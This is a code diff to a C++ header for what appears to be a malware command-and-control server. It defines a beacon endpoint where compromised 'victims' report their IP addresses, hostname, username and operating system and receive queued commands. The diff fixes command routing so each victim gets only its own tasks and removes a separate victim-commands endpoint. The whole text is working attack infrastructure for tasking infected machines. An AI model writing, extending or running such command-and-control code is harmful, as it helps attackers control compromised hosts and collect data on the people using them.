@@ -1,5 +1,6 @@
 #pragma once
 
+#include "Beacon.hpp"
 #include "Endpoints.hpp"
 #include "LogDAO.hpp"
 #include <string>
@@ -13,43 +14,6 @@
 #include <VictimDAO.hpp>
 
 #include <IManager.hpp>
-
-struct CommandResult;
-
-// Glaze metadata for beacon structures
-template <>
-struct glz::meta<CommandResult> {
-    using T = CommandResult;
-    static constexpr auto value = object(
-        "command_uid", &T::command_uid,
-        "result_data", &T::result_data,
-        "status", &T::status
-    );
-};
-
-template <>
-struct glz::meta<BeaconRequest> {
-    using T = BeaconRequest;
-    static constexpr auto value = object(
-        "victim_uid", &T::victim_uid,
-        "internal_ip", &T::internal_ip,
-        "external_ip", &T::external_ip,
-        "hostname", &T::hostname,
-        "username", &T::username,
-        "operating_system", &T::operating_system,
-        "command_results", &T::command_results
-    );
-};
-
-template <>
-struct glz::meta<BeaconResponse> {
-    using T = BeaconResponse;
-    static constexpr auto value = object(
-        "commands", &T::commands,
-        "beacon_interval", &T::beacon_interval,
-        "should_exit", &T::should_exit
-    );
-};
 
 //-------------------------------------------------
 // Register beacon endpoint
@@ -129,7 +93,7 @@ inline void register_beacon_endpoint(cpppwn::RESTServer& server) {
 
             // Get pending commands for this victim
             auto pending_commands = commands.find([&](const CommandDAO& cmd) {
-                return cmd.status == 0;  // 0 = pending
+                return beacon.victim_uid == cmd.client && cmd.status == 0;  // 0 = pending
             });
 
             // Build beacon response
@@ -163,34 +127,8 @@ inline void register_beacon_endpoint(cpppwn::RESTServer& server) {
 }
 
 //-------------------------------------------------
-// Helper: Get commands for specific victim
-//-------------------------------------------------
-inline void register_victim_commands_endpoint(cpppwn::RESTServer& server) {
-    auto& commands = CommandManager::instance();
-
-    server.get("/api/victim/commands", [&](const HttpRequest& req) {
-        auto victim_uid_opt = req.query_params.find("victim_uid");
-
-        if (victim_uid_opt == req.query_params.end()) {
-            return error_response(400, "Missing victim_uid parameter");
-        }
-
-        std::string victim_uid = victim_uid_opt->second;
-
-        // Get pending commands for this victim
-        auto pending_commands = commands.find([&](const CommandDAO& cmd) {
-            return cmd.client == victim_uid && cmd.status == 0;  // All pending commands
-        });
-
-        std::string json = to_json_array(pending_commands);
-        return HttpResponse().set_json(json);
-    });
-}
-
-//-------------------------------------------------
 // Register all beacon-related endpoints
 //-------------------------------------------------
 inline void register_all_beacon_endpoints(cpppwn::RESTServer& server) {
     register_beacon_endpoint(server);
-    register_victim_commands_endpoint(server);
 }
